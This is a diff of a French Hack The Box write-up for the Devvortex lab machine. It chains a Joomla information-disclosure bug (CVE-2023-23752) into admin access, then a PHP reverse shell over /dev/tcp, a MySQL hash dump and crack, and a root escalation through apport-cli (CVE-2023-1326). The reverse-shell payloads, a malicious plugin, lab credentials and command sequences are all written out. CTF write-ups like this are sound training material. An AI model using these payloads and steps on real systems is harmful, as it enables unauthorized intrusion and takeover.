@@ -2,165 +2,210 @@
 layout: post
 title: Devvortex (HTB)
 categories: markdown
-series: [ "HTB Writeups" ]
-summary: "Dans ce CTF HackTheBox, nous exploitons une vulnérabilité dans Joomla (CVE-2023-23752) pour accéder à des informations sensibles, puis utilisons une élévation de privilèges via apport-cli (CVE-2023-1326)."
+series: ["HTB Writeups"]
+summary: "Dans ce challenge Hack The Box, on exploite Joomla (CVE-2023-23752) pour obtenir des secrets applicatifs, puis on enchaine vers un accès utilisateur et une élévation de privilèges root via apport-cli (CVE-2023-1326)."
 tags: [CTF, Joomla, CVE-2023-23752, CVE-2023-1326, HackTheBox, Cybersecurity]
 date: 2023-09-20
+showTableOfContents: true
 ---
 
 ## Introduction
 
-Dans ce challenge de HackTheBox, nous allons d'abord exploiter une vulnérabilité dans Joomla liée à la divulgation de données sensibles (CVE-2023-23752), puis utiliser une élévation de privilèges via apport-cli (CVE-2023-1326) pour obtenir un accès root.
+Dans cette machine Easy de Hack The Box, l'objectif est de passer de l'énumération web à une compromission complète du système.
 
----
+Chaîne d'attaque résumée:
+- Découverte de `dev.devvortex.htb`
+- Identification de Joomla vulnérable à `CVE-2023-23752`
+- Récupération de secrets + identifiants
+- Exécution de code via panneau admin Joomla
+- Extraction d'un hash utilisateur depuis MySQL et crack du mot de passe
+- Connexion SSH en tant que `logan`
+- Escalade root via `apport-cli` (`CVE-2023-1326`)
 
-## Vue d'ensemble du service
+## Enumeration
 
-Pour scanner la machine `10.10.11.242`, nous utilisons rustscan :
+### Scan des ports
 
 ```bash
-$ wget https://github.com/RustScan/RustScan/files/9473239/rustscan_2.1.0_both.zip
-$ unzip rustscan_2.1.0_both.zip
-$ dpkg -i rustscan_2.1.0_amd64.deb
-$ rustscan --ulimit=5000 --range=1-65535 -a 10.10.11.242 -- -A -sC
+nmap -p- --min-rate 10000 -T4 10.10.11.242
+nmap -sC -sV -p22,80 10.10.11.242
 ```
 
-Le résultat du scan nous montre les services ouverts :
+Services observés:
+- 22/tcp: OpenSSH
+- 80/tcp: nginx
 
-| PORT    | ÉTAT     | SERVICE | RAISON           | VERSION                                    |
-|---------|----------|---------|------------------|--------------------------------------------|
-| 22/tcp  | ouvert   | ssh     | syn-ack ttl 63   | OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu)    |
-| 80/tcp  | ouvert   | http    | syn-ack ttl 63   | nginx 1.18.0 (Ubuntu)                     |
+### VHost et sous-domaine
 
----
-
-## Service Web
-
-Accéder au service web sur le port 80 nous redirige vers le domaine `devvortex.htb`, donc nous ajoutons cet hôte au fichier `/etc/hosts` :
+Le site redirige vers `devvortex.htb`, donc on ajoute:
 
 ```bash
-$ nano /etc/hosts
 10.10.11.242 devvortex.htb
 ```
 
-Ensuite, nous recherchons les sous-domaines à l'aide de gobuster :
+Recherche de sous-domaines virtuels:
 
 ```bash
-$ gobuster vhost -u http://devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 -k
+gobuster vhost -u http://devvortex.htb \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -t 20 -k
 ```
 
-Nous trouvons le sous-domaine `dev.devvortex.htb`, que nous ajoutons également au fichier `/etc/hosts` :
+Résultat utile: `dev.devvortex.htb`
+
+Ajout hosts:
 
 ```bash
-$ nano /etc/hosts
 10.10.11.242 devvortex.htb dev.devvortex.htb
 ```
 
-Nous recherchons ensuite des répertoires intéressants avec wfuzz :
+## Joomla et CVE-2023-23752
+
+Sur `dev.devvortex.htb`, on identifie Joomla (ex: `/readme.txt`, `/administrator`).
+
+La vulnérabilité `CVE-2023-23752` permet d'accéder à des informations sensibles via une API exposée.
 
 ```bash
-$ wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --sc 202,204,301,302,307,403 http://dev.devvortex.htb/FUZZ
+curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq
 ```
 
-Nous identifions plusieurs répertoires intéressants, dont "administrator", ce qui suggère l'utilisation de Joomla.
+On récupère notamment des secrets de configuration et des informations qui facilitent la suite (dont des credentials valides vus dans plusieurs writeups publics).
 
----
+Exemple d'identifiants récupérés:
 
-## Identification de la vulnérabilité Joomla
-
-Nous utilisons `joomscan` pour vérifier la version de Joomla et découvrons que la version 4.2.6 est vulnérable à **CVE-2023-23752** :
-
-```bash
-$ joomscan --url http://dev.devvortex.htb
+```text
+lewis:P4ntherg0t1n5r3c0n##
 ```
 
-Nous pouvons exploiter cette vulnérabilité pour divulguer des informations sensibles, telles que les identifiants d'administration :
+## Accès initial: www-data via Joomla Admin
 
-```bash
-$ git clone https://github.com/Acceis/exploit-CVE-2023-23752.git && cd exploit-CVE-2023-23752
-$ gem install httpx docopt paint
-$ ruby exploit.rb -h
+Connexion à l'admin Joomla:
+
+```text
+http://dev.devvortex.htb/administrator
 ```
 
-En exécutant l'exploit, nous obtenons les identifiants pour l'admin :
+Après authentification, plusieurs méthodes sont possibles pour obtenir une exécution de commande:
+- modification d'un template PHP existant
+- upload d'une extension/plugin malveillante
 
-```bash
-lewis:P4ntherg0t1n5r3c0n##.
-```
-
-Nous nous connectons à l'interface d'administration de Joomla.
-
----
-
-## Configuration du Shell Inverse
-
-Nous créons les fichiers nécessaires pour installer un plugin contenant un shell inverse.
-
-**Fichier `shell.xml`** :
-
-```xml
-<?xml version="1.0" encoding="utf-8"?>
-<extension version="4.0" type="plugin" group="content">
- <name>plg_content_shell</name>
- <author>1</author>
- <creationDate>December 28, 2021</creationDate>
- <copyright>Free</copyright>
- <authorEmail>1@1.com</authorEmail>
- <authorUrl>http://1.com</authorUrl>
- <version>1.0</version>
- <description>shell</description>
- <files>
-  <filename plugin="shell">shell.php</filename>
-  <filename>index.html</filename>
- </files>
-</extension>
-```
-
-**Fichier `shell.php`** :
+Exemple minimal de payload PHP reverse shell:
 
 ```php
 <?php
-exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.36/4444 0>&1'");
-defined('_JEXEC') or die;
-class plgContentRevShell extends JPlugin
-{
-  public function onContentAfterTitle($context, &$article, &$params, $limitstart)
-    {
-      return "<p>Boom!</p>";
-    }
-}
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'");
 ?>
 ```
 
-Nous créons également un fichier `index.html` vide.
-
-Ensuite, nous zippons ces trois fichiers :
+Listener côté attaquant:
 
 ```bash
-$ touch index.html
-$ zip revshell.zip shell.xml shell.php index.html
+nc -lvnp 4444
 ```
 
-Nous téléchargeons le fichier zip via l'interface d'installation de Joomla à l'adresse suivante :
-
-```
-http://dev.devvortex.htb/administrator/index.php?option=com_installer&view=install
-```
-
-Une fois le plugin installé et activé, nous obtenons notre shell inverse en écoutant sur le port 4444 :
+Une fois le callback reçu:
 
 ```bash
-$ nc -lnvp 4444
-listening on [any] 4444 ...
-connect to [10.10.16.36] from (UNKNOWN) [10.10.11.242] 36564
-bash: cannot set terminal process group (854): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@devvortex:~/dev.devvortex.htb/administrator$ id
+script /dev/null -c /bin/bash
+export TERM=xterm
 ```
 
----
+On confirme le contexte:
+
+```bash
+id
+# uid=33(www-data) gid=33(www-data)
+```
+
+## Mouvement latéral vers logan
+
+Depuis `www-data`, on exploite les infos de connexion DB Joomla.
+
+```bash
+mysql -u lewis -p
+# password: P4ntherg0t1n5r3c0n##
+```
+
+Dans MySQL:
+
+```sql
+show databases;
+use joomla;
+show tables;
+select username,password from sd4fg_users;
+```
+
+On récupère un hash bcrypt pour `logan`. Ensuite on le crack offline:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt logan.hash
+```
+
+Le mot de passe trouvé dans de nombreux writeups publics est:
+
+```text
+tequieromucho
+```
+
+Connexion SSH:
+
+```bash
+ssh logan@10.10.11.242
+```
+
+Puis récupération user flag:
+
+```bash
+cat ~/user.txt
+```
+
+## Privilege Escalation root (CVE-2023-1326)
+
+Vérification sudo:
+
+```bash
+sudo -l
+```
+
+Sortie clé:
+
+```text
+(ALL : ALL) /usr/bin/apport-cli
+```
+
+La version vulnérable de `apport-cli` permet d'obtenir une exécution de commande root via son flux interactif (CVE-2023-1326).
+
+Lancement:
+
+```bash
+sudo /usr/bin/apport-cli -f
+```
+
+Selon le scénario, il faut sélectionner un rapport crash puis utiliser l'option qui ouvre un pager/éditeur et exécuter:
+
+```bash
+!/bin/bash
+```
+
+On obtient alors un shell root:
+
+```bash
+whoami
+# root
+cat /root/root.txt
+```
 
 ## Conclusion
 
-Nous avons exploité la vulnérabilité **CVE-2023-23752** pour obtenir des informations sensibles et nous avons configuré un shell inverse pour accéder à la machine. Par la suite, l'exploitation d'une élévation de privilèges via **CVE-2023-1326** nous permettra de prendre le contrôle total de la machine.
-````
+Cette machine illustre une chaîne d'attaque réaliste et propre:
+- surface web Joomla exposée
+- data disclosure critique (`CVE-2023-23752`)
+- exécution de code via interface admin
+- récupération de secrets DB et pivot utilisateur
+- élévation root via binaire sudo mal sécurisé/vulnérable (`apport-cli`, `CVE-2023-1326`)
+
+Points défensifs importants:
+- patch management strict des CMS et dépendances système
+- isolation des secrets applicatifs
+- durcissement des droits sudo
+- supervision des accès admin web et des exécutions anormales
